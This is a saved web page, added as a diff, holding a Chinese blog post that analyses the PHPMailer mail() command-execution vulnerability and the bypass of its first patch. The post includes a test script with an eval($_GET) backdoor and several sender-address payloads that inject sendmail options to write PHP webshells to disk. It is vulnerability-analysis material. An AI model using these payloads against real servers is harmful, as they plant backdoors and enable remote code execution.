@@ -1,0 +1,517 @@
+<!DOCTYPE HTML>
+
+<html>
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"/>
+<meta content="yes" name="apple-mobile-web-app-capable">
+<title>PHPMailer 命令执行漏洞分析 - Veneno's Blog</title>
+<link href="./PHPMailer 命令执行漏洞分析 - Veneno's Blog/highslide.css" rel="stylesheet" type="text/css"/>
+<!--[if lt IE 7]>
+<link rel="stylesheet" type="text/css" href="http://www.venenof.com/usr/plugins/HighSlide/css/highslide-ie6.css" />
+<![endif]-->
+<meta content="ph师傅以及Hcamael师傅写的感觉已经很详细了，自己也研究了下：首先，根据一开始爆出来的漏洞，利用条件是这样的，当时扬哥跟我说很鸡肋，自己也没有仔细研究：php version &amp;lt; 5..." name="description">
+<script type="text/javascript">
+(function () {
+    window.TypechoComment = {
+        dom : function (id) {
+            return document.getElementById(id);
+        },
+    
+        create : function (tag, attr) {
+            var el = document.createElement(tag);
+        
+            for (var key in attr) {
+                el.setAttribute(key, attr[key]);
+            }
+        
+            return el;
+        },
+
+        reply : function (cid, coid) {
+            var comment = this.dom(cid), parent = comment.parentNode,
+                response = this.dom('respond-post-222'), input = this.dom('comment-parent'),
+                form = 'form' == response.tagName ? response : response.getElementsByTagName('form')[0],
+                textarea = response.getElementsByTagName('textarea')[0];
+
+            if (null == input) {
+                input = this.create('input', {
+                    'type' : 'hidden',
+                    'name' : 'parent',
+                    'id'   : 'comment-parent'
+                });
+
+                form.appendChild(input);
+            }
+
+            input.setAttribute('value', coid);
+
+            if (null == this.dom('comment-form-place-holder')) {
+                var holder = this.create('div', {
+                    'id' : 'comment-form-place-holder'
+                });
+
+                response.parentNode.insertBefore(holder, response);
+            }
+
+            comment.appendChild(response);
+            this.dom('cancel-comment-reply-link').style.display = '';
+
+            if (null != textarea && 'text' == textarea.name) {
+                textarea.focus();
+            }
+
+            return false;
+        },
+
+        cancelReply : function () {
+            var response = this.dom('respond-post-222'),
+            holder = this.dom('comment-form-place-holder'), input = this.dom('comment-parent');
+
+            if (null != input) {
+                input.parentNode.removeChild(input);
+            }
+
+            if (null == holder) {
+                return true;
+            }
+
+            this.dom('cancel-comment-reply-link').style.display = 'none';
+            holder.parentNode.insertBefore(response, holder);
+            return false;
+        }
+    };
+})();
+</script>
+<script type="text/javascript">
+(function () {
+    var event = document.addEventListener ? {
+        add: 'addEventListener',
+        focus: 'focus',
+        load: 'DOMContentLoaded'
+    } : {
+        add: 'attachEvent',
+        focus: 'onfocus',
+        load: 'onload'
+    };
+
+    document[event.add](event.load, function () {
+        var r = document.getElementById('respond-post-222');
+
+        if (null != r) {
+            var forms = r.getElementsByTagName('form');
+            if (forms.length > 0) {
+                var f = forms[0], textarea = f.getElementsByTagName('textarea')[0], added = false;
+
+                if (null != textarea && 'text' == textarea.name) {
+                    textarea[event.add](event.focus, function () {
+                        if (!added) {
+                            var input = document.createElement('input');
+                            input.type = 'hidden';
+                            input.name = '_';
+                            input.value = (function () {
+    var _2cz = 'a21'//'opk'
++'668'//'Luv'
++//'5N'
+'e20'+//'SV'
+'406'+'6'//'9'
++//'s'
+'5'+//'z'
+'2'+'2'//'es'
++'c9'//'Oa'
++/* 'cNU'//'cNU' */''+//'M'
+'80'+''///*'rp'*/'rp'
++'24'//'u'
++//'oNn'
+'5'+//'4P3'
+'5'+//'Ku'
+'74'+/* 'E4'//'E4' */''+'fhF'//'fhF'
++'f7'//'w4'
++'5d'//'uBU'
++'7'//'R0'
++'qGn'//'qGn'
++''///*'gC'*/'gC'
++'8'//'r9s'
+, _WzOx = [[26,29],[31,34]];
+    
+    for (var i = 0; i < _WzOx.length; i ++) {
+        _2cz = _2cz.substring(0, _WzOx[i][0]) + _2cz.substring(_WzOx[i][1]);
+    }
+
+    return _2cz;
+})();
+
+                            f.appendChild(input);
+                            added = true;
+                        }
+                    });
+                }
+            }
+        }
+    });
+})();
+</script><link href="./PHPMailer 命令执行漏洞分析 - Veneno's Blog/style.css" rel="stylesheet"/>
+<link href="./PHPMailer 命令执行漏洞分析 - Veneno's Blog/prism.css" rel="stylesheet"/>
+<link href="./PHPMailer 命令执行漏洞分析 - Veneno's Blog/iconfont.css" rel="stylesheet"/>
+<link href="./PHPMailer 命令执行漏洞分析 - Veneno's Blog/player.css" rel="stylesheet"/>
+<link href="" rel="shortcut icon"/>
+</meta></meta></head>
+<body>
+<header>
+<div class="main">
+<div class="intro"> <img class="intro-logo" src="./PHPMailer 命令执行漏洞分析 - Veneno's Blog/veneno.jpeg"/> <span class="intro-sitename"><a href="http://www.venenof.com/">
+      Veneno's Blog      </a></span> <span class="intro-siteinfo">
+      The harder you struggle today,the more glorious you will be tomorrow.      </span> <span class="social"> <a href="" target="_blank"><i class="iconfont icon-qq"></i></a> <a href="" target="_blank"><i class="iconfont icon-mail"></i></a> <a href="" target="_blank"><i class="iconfont icon-weibo"></i></a> <a href="" target="_blank"><i class="iconfont icon-github"></i></a> </span> </div>
+<nav>
+<div class="collapse">
+<i class="iconfont icon-menu"></i></div>
+<ul class="bar">
+<li><a href="http://www.venenof.com/">首页</a></li>
+<li><a href="http://www.venenof.com/index.php/archive.html">
+          时间          </a></li>
+<li><a href="http://www.venenof.com/index.php/link.html">
+          友链          </a></li>
+<li><a href="http://www.venenof.com/index.php/Veneno.html">
+          About Me          </a></li>
+</ul>
+</nav>
+<a class="icon-search" id="btnChange" onclick="searchbox();"></a>
+<div id="search" style="display:none">
+<div class="icon-close" onclick="searchbox();"></div>
+<form action="/index.php" class="search" id="searchform" method="get" name="form">
+<input autofocus="autofocus" id="searchText" name="s" placeholder="输入关键字查找" style="margin-top:25%" type="search"/>
+</form>
+</div>
+</div></header><content>
+<div class="main">
+<div class="article">
+<div class="article-title">PHPMailer 命令执行漏洞分析</div>
+<small class="article-time">发表于： <time datetime="2016-12-29T16:32:00+00:00" itemprop="datePublished">2016-12-29</time> | 分类： <a href="http://www.venenof.com/index.php/category/PHP/">PHP</a>,<a href="http://www.venenof.com/index.php/category/Web/">Web</a> | <a href="http://www.venenof.com/index.php/archives/222/#comments" itemprop="discussionUrl">评论：0 </a> | 阅读：473</small>
+<div class="article-content">
+<p>ph师傅以及Hcamael师傅写的感觉已经很详细了，自己也研究了下：<br/>
+首先，根据一开始爆出来的漏洞，利用条件是这样的，当时扬哥跟我说很鸡肋，自己也没有仔细研究：</p>
+<pre><code class="language-php">php version &lt; 5.2.0//当时以为...这么低的版本这个洞太鸡肋了
+no pcre
+phpmailer &lt; 5.2.18
+php safe_mode = false
+</code></pre>
+<p>漏洞成因与Roundcube的rce大致相同，都是因为mail函数的第五个参数(设置额外参数)导致了rce：<br/>
+sendmail有一个-X参数，该参数将邮件流量记录在指定文件中：<br/>
+代码在文件class.phpmailer.php</p>
+<pre><code class="language-php">private function mailPassthru($to, $subject, $body, $header, $params)
+{
+//Check overloading of mail function to avoid double-encoding
+if (ini_get('mbstring.func_overload') &amp; 1) {
+    $subject = $this-&gt;secureHeader($subject);
+} else {
+    $subject = $this-&gt;encodeHeader($this-&gt;secureHeader($subject));
+}
+
+//Can't use additional_parameters in safe_mode
+//@link http://php.net/manual/en/function.mail.php
+if (ini_get('safe_mode') or !$this-&gt;UseSendmailOptions or is_null($params)) {
+    $result = @mail($to, $subject, $body, $header);
+} else {
+    $result = @mail($to, $subject, $body, $header, $params);
+}
+return $result;
+}
+</code></pre>
+<p>依旧需要safe_mode关闭才可以。<br/>
+那么接下来需要追踪下<strong>$params</strong>这个参数：</p>
+<pre><code class="language-php">protected function mailSend($header, $body)
+{
+    $toArr = array();
+    foreach ($this-&gt;to as $toaddr) {
+        $toArr[] = $this-&gt;addrFormat($toaddr);
+    }
+    $to = implode(', ', $toArr);
+
+    $params = null;
+    //This sets the SMTP envelope sender which gets turned into a return-path header by the receiver
+    if (!empty($this-&gt;Sender)) {
+        $params = sprintf('-f%s', $this-&gt;Sender);
+    }
+</code></pre>
+<p>不难发现，$params是经过$this-&gt;Sender传进来的，那么找一下$this-&gt;Sender：</p>
+<pre><code class="language-php">public function setFrom($address, $name = '', $auto = true)
+{
+    代码:XXX
+    if ($auto) {
+        if (empty($this-&gt;Sender)) {
+            $this-&gt;Sender = $address;
+        }
+    }
+    return true;
+}
+</code></pre>
+<p>将setFrom的$address进行赋值，找一下处理$address的函数validateAddress:</p>
+<pre><code class="language-php">if (defined('PCRE_VERSION')) {
+                //This pattern can get stuck in a recursive loop in PCRE &lt;= 8.0.2
+                if (version_compare(PCRE_VERSION, '8.0.3') &gt;= 0) {
+                    $patternselect = 'pcre8';
+                } else {
+                    $patternselect = 'pcre';
+                }
+            } elseif (function_exists('extension_loaded') and extension_loaded('pcre')) {
+                //Fall back to older PCRE
+                $patternselect = 'pcre';
+            } else {
+                //Filter_var appeared in PHP 5.2.0 and does not require the PCRE extension
+                if (version_compare(PHP_VERSION, '5.2.0') &gt;= 0) {
+                    $patternselect = 'php';
+                } else {
+                    $patternselect = 'noregex';
+                }
+            }
+</code></pre>
+<p>就是说如果没有prce并且php版本&lt;5.2.0，则$patternselect = 'noregex'，接着往下看：</p>
+<pre><code class="language-php">switch ($patternselect) {
+            case 'pcre8':
+                /**
+                 * Uses the same RFC5322 regex on which FILTER_VALIDATE_EMAIL is based, but allows dotless domains.
+                 * @link http://squiloople.com/2009/12/20/email-address-validation/
+                 * @copyright 2009-2010 Michael Rushton
+                 * Feel free to use and redistribute this code. But please keep this copyright notice.
+                 */
+                return (boolean)preg_match(
+                    '/^(?!(?&gt;(?1)"?(?&gt;\\\[ -~]|[^"])"?(?1)){255,})(?!(?&gt;(?1)"?(?&gt;\\\[ -~]|[^"])"?(?1)){65,}@)' .
+                    '((?&gt;(?&gt;(?&gt;((?&gt;(?&gt;(?&gt;\x0D\x0A)?[\t ])+|(?&gt;[\t ]*\x0D\x0A)?[\t ]+)?)(\((?&gt;(?2)' .
+                    '(?&gt;[\x01-\x08\x0B\x0C\x0E-\'*-\[\]-\x7F]|\\\[\x00-\x7F]|(?3)))*(?2)\)))+(?2))|(?2))?)' .
+                    '([!#-\'*+\/-9=?^-~-]+|"(?&gt;(?2)(?&gt;[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]|\\\[\x00-\x7F]))*' .
+                    '(?2)")(?&gt;(?1)\.(?1)(?4))*(?1)@(?!(?1)[a-z0-9-]{64,})(?1)(?&gt;([a-z0-9](?&gt;[a-z0-9-]*[a-z0-9])?)' .
+                    '(?&gt;(?1)\.(?!(?1)[a-z0-9-]{64,})(?1)(?5)){0,126}|\[(?:(?&gt;IPv6:(?&gt;([a-f0-9]{1,4})(?&gt;:(?6)){7}' .
+                    '|(?!(?:.*[a-f0-9][:\]]){8,})((?6)(?&gt;:(?6)){0,6})?::(?7)?))|(?&gt;(?&gt;IPv6:(?&gt;(?6)(?&gt;:(?6)){5}:' .
+                    '|(?!(?:.*[a-f0-9]:){6,})(?8)?::(?&gt;((?6)(?&gt;:(?6)){0,4}):)?))?(25[0-5]|2[0-4][0-9]|1[0-9]{2}' .
+                    '|[1-9]?[0-9])(?&gt;\.(?9)){3}))\])(?1)$/isD',
+                    $address
+                );
+            case 'pcre':
+                //An older regex that doesn't need a recent PCRE
+                return (boolean)preg_match(
+                    '/^(?!(?&gt;"?(?&gt;\\\[ -~]|[^"])"?){255,})(?!(?&gt;"?(?&gt;\\\[ -~]|[^"])"?){65,}@)(?&gt;' .
+                    '[!#-\'*+\/-9=?^-~-]+|"(?&gt;(?&gt;[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]|\\\[\x00-\xFF]))*")' .
+                    '(?&gt;\.(?&gt;[!#-\'*+\/-9=?^-~-]+|"(?&gt;(?&gt;[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]|\\\[\x00-\xFF]))*"))*' .
+                    '@(?&gt;(?![a-z0-9-]{64,})(?&gt;[a-z0-9](?&gt;[a-z0-9-]*[a-z0-9])?)(?&gt;\.(?![a-z0-9-]{64,})' .
+                    '(?&gt;[a-z0-9](?&gt;[a-z0-9-]*[a-z0-9])?)){0,126}|\[(?:(?&gt;IPv6:(?&gt;(?&gt;[a-f0-9]{1,4})(?&gt;:' .
+                    '[a-f0-9]{1,4}){7}|(?!(?:.*[a-f0-9][:\]]){8,})(?&gt;[a-f0-9]{1,4}(?&gt;:[a-f0-9]{1,4}){0,6})?' .
+                    '::(?&gt;[a-f0-9]{1,4}(?&gt;:[a-f0-9]{1,4}){0,6})?))|(?&gt;(?&gt;IPv6:(?&gt;[a-f0-9]{1,4}(?&gt;:' .
+                    '[a-f0-9]{1,4}){5}:|(?!(?:.*[a-f0-9]:){6,})(?&gt;[a-f0-9]{1,4}(?&gt;:[a-f0-9]{1,4}){0,4})?' .
+                    '::(?&gt;(?:[a-f0-9]{1,4}(?&gt;:[a-f0-9]{1,4}){0,4}):)?))?(?&gt;25[0-5]|2[0-4][0-9]|1[0-9]{2}' .
+                    '|[1-9]?[0-9])(?&gt;\.(?&gt;25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])){3}))\])$/isD',
+                    $address
+                );
+            case 'html5':
+                /**
+                 * This is the pattern used in the HTML5 spec for validation of 'email' type form input elements.
+                 * @link http://www.whatwg.org/specs/web-apps/current-work/#e-mail-state-(type=email)
+                 */
+                return (boolean)preg_match(
+                    '/^[a-zA-Z0-9.!#$%&amp;\'*+\/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}' .
+                    '[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/sD',
+                    $address
+                );
+            case 'noregex':
+                //No PCRE! Do something _very_ approximate!
+                //Check the address is 3 chars or longer and contains an @ that's not the first or last char
+                return (strlen($address) &gt;= 3
+                    and strpos($address, '@') &gt;= 1
+                    and strpos($address, '@') != strlen($address) - 1);
+            case 'php':
+            default:
+                return (boolean)filter_var($address, FILTER_VALIDATE_EMAIL);
+        }
+</code></pre>
+<p>而在noregex下，基本上有个@号就能过...也就是对address基本没处理，这样带入到mail中当然会rce。<br/>
+那么如果我们能够绕过那一段正则，那么是不是就不鸡肋，答案是肯定的：<br/>
+具体的正则绕过可以参见ph师傅的<a href="https://www.leavesongs.com/PENETRATION/how-to-analyze-long-regex.html">blog</a><br/>
+所以本地构造：</p>
+<pre><code class="language-php">&lt;?php
+eval($_GET[ven]);
+require '/var/www/PHPMailer/PHPMailerAutoload.php';
+$mail = new PHPMailer;
+$email = $_POST['veneno'];
+$mail-&gt;Subject = '&lt;?php phpinfo();?&gt;';
+$mail-&gt;addAddress('c@d.com', 'attacker');
+$mail-&gt;msgHTML('test');
+$mail-&gt;AltBody = 'Body';
+$log = $mail-&gt;setFrom($email);
+var_dump($mail-&gt;Sender);
+$mail-&gt;send();
+?&gt;
+</code></pre>
+<p><img alt="1.png" src="./PHPMailer 命令执行漏洞分析 - Veneno's Blog/2842143424.png"/><br/>
+payload的种类：</p>
+<pre><code class="language-php">a. -OQueueDirectory=/tmp/. -X/tmp/shell.php @qq.com
+() -OQueueDirectory=/tmp/. -X/tmp/shell.php @qq.com
+a( -X/home/www/backdoor.php -OQueueDirectory=/tmp )@qq.com
+" -X/home/www/backdoor.php -OQueueDirectory=/tmp "@qq.com
+</code></pre>
+<p>官方对这个漏洞做的patch是这个样子：</p>
+<pre><code class="language-php">$params = sprintf('-f%s', escapeshellarg($this-&gt;Sender));
+</code></pre>
+<p>但是这样依旧能绕过，具体的可以参见Hcamael师傅的blog，那么问题出在哪里，我们看一下mail.c：</p>
+<pre><code class="language-php">if (force_extra_parameters) {
+        extra_cmd = php_escape_shell_cmd(force_extra_parameters);
+    } else if (extra_cmd) {
+        extra_cmd = php_escape_shell_cmd(extra_cmd);
+    }
+</code></pre>
+<p>也就是先escapeshellarg而后escapeshellcmd，这样也造成了escapeshellarg的保护没法达到预期的效果，从而再次RCE：</p>
+<pre><code class="language-php">a'( -OQueueDirectory=/tmp -X/tmp/backdoor.php )@qq.com
+=&gt;escapeshellarg
+'a'\''( -OQueueDirectory=/tmp -X/tmp/123.php )@qq.com'
+=&gt;escapeshellcmd
+'a'\\''\( -OQueueDirectory=/tmp -X/tmp/123.php \)@qq.com\'
+</code></pre>
+<hr/>
+<p>后话，这个洞貌似在其他cms并没有什么典型特征，看了下wordpress，是在后台调用的，可是能进后台一般插件就能getshell..不知道别的cms会不会在前台存在这个洞(逃</p>
+</div>
+<div class="post-footer">
+<div class=" post-tags">
+<div class="tag"> 标签: none</div>
+<div class="post-nav">
+<li class="prev"><a href="http://www.venenof.com/index.php/archives/213/" title="apk入门的一些小总结">apk入门的一些小总结</a></li>
+<li class="next">
+<a href="http://www.venenof.com/index.php/archives/224/" title="33C3-list0r-wp">33C3-list0r-wp</a></li>
+</div>
+</div>
+</div>
+</div></div></content>
+<div id="comments">
+<!-- Duoshuo Comment BEGIN -->
+<div class="ds-thread" data-author-key="1" data-thread-key="222" data-title="PHPMailer 命令执行漏洞分析" data-url=""></div>
+<script type="text/javascript">
+	var duoshuoQuery = {short_name:"veneno1",theme:"dark"};
+	(function() {
+		var ds = document.createElement("script");
+		ds.type = "text/javascript";ds.async = true;
+		ds.src = "http://static.duoshuo.com/embed.js";
+		ds.charset = "UTF-8";
+		(document.getElementsByTagName("head")[0] 
+		|| document.getElementsByTagName("body")[0]).appendChild(ds);
+	})();
+	</script>
+<!-- Duoshuo Comment END -->
+</div>
+</body></html>
+﻿<div class="willerce">
+<div> </div>
+<!--播放器 -->
+<div id="QPlayer">
+<div id="pContent">
+<div id="player"> <span class="cover"></span>
+<div class="ctrl">
+<div class="musicTag marquee"> <strong>Title</strong> <span> - </span> <span class="artist">Artist</span> </div>
+<div class="progress">
+<div class="timer left">0:00</div>
+<div class="contr">
+<div class="rewind icon"></div>
+<div class="playback icon"></div>
+<div class="fastforward icon"></div>
+</div>
+<div class="right">
+<div class="liebiao icon"></div>
+</div>
+</div>
+</div>
+</div>
+<div class="ssBtn">
+<div class="adf"></div>
+</div>
+</div>
+<ol id="playlist">
+</ol>
+</div>
+<script src="./PHPMailer 命令执行漏洞分析 - Veneno's Blog/jquery.min.js"></script>
+<script src="./PHPMailer 命令执行漏洞分析 - Veneno's Blog/jquery.marquee.min.js"></script>
+<script>
+	var	playlist = [	
+];
+  var isRotate = 1;
+  var autoplay = ;  
+</script>
+<script src="./PHPMailer 命令执行漏洞分析 - Veneno's Blog/player.js"></script>
+<script>
+function bgChange(){
+	var lis= $('.lib');
+	for(var i=0; i<lis.length; i+=2)
+	lis[i].style.background = 'rgba(246, 246, 246, 0.5)';
+}
+window.onload = bgChange;
+</script>
+<!--<div class="qrcode">
+  <img src="" width="126" height="136" alt=""> </div>-->
+<footer>
+<p> <a href="" target="_blank">网站地图</a><br/>
+Copyright © 2015-2017 <a href="http://www.venenof.com/">
+    Veneno's Blog    
+<script src="./PHPMailer 命令执行漏洞分析 - Veneno's Blog/highslide.packed.js" type="text/javascript"></script>
+<script type="text/javascript">
+//<![CDATA[
+hs.graphicsDir = "http://www.venenof.com/usr/plugins/HighSlide/css/graphics/";
+hs.fadeInOut = true;
+hs.transitions = ["expand","crossfade"];
+hs.lang.creditsText = "&copy; www.venenof.com";
+hs.lang.creditsTitle = "&copy; www.venenof.com";
+hs.creditsHref = "http://www.venenof.com/index.php";
+hs.creditsPosition = "top left";
+hs.lang={
+loadingText : "载入中...",
+loadingTitle : "取消",
+closeText : "关闭",
+closeTitle : "关闭 (Esc)",
+previousText : "上一张",
+previousTitle : "上一张 (←键)",
+nextText : "下一张",
+nextTitle : "下一张 (→键)",
+moveTitle : "移动",
+moveText : "移动",
+playText : "播放",
+playTitle : "幻灯播放 (空格键)",
+pauseText : "暂停",
+pauseTitle : "幻灯暂停 (空格键)",
+number : "第%1张 共%2张",
+restoreTitle :	"点击关闭或拖动. 左右方向键切换图片. ",
+fullExpandTitle : "完整尺寸",
+fullExpandText :  "原大"
+};
+//]]>
+</script>
+<script>
+document.body.addEventListener('copy', function (e) {
+    if (window.getSelection().toString() && window.getSelection().toString().length > 10) {
+        setClipboardText(e);
+    }
+}); 
+function setClipboardText(event) {
+    var clipboardData = event.clipboardData || window.clipboardData;
+    if (clipboardData) {
+        event.preventDefault();
+        var htmlData = ''
+            + '著作权归作者所有。<br>'
+            + '商业转载请联系作者获得授权，非商业转载请注明出处。<br>'
+            + '作者：Veneno<br>'
+            + '链接：' + window.location.href + '<br>'
+            + '来源：http://www.venenof.com/<br><br>'
+            + window.getSelection().toString();
+        var textData = ''
+            + '著作权归作者所有。\n'
+            + '商业转载请联系作者获得授权，非商业转载请注明出处。\n'
+            + '作者：Veneno\n'
+            + '链接：' + window.location.href + '\n'
+            + '来源：http://www.venenof.com/\n\n'
+            + window.getSelection().toString();
+        clipboardData.setData('text/html', htmlData);
+        clipboardData.setData('text/plain',textData);
+    }
+}
+</script>
+</a></p></footer>
+<div class="toTop">TOP</div>
+<script src="./PHPMailer 命令执行漏洞分析 - Veneno's Blog/all.js"></script>
+<script src="./PHPMailer 命令执行漏洞分析 - Veneno's Blog/jquery.js"></script>
+<script src="./PHPMailer 命令执行漏洞分析 - Veneno's Blog/prism.js"></script>
+<script src="./PHPMailer 命令执行漏洞分析 - Veneno's Blog/search.js"></script>
+</div>
+
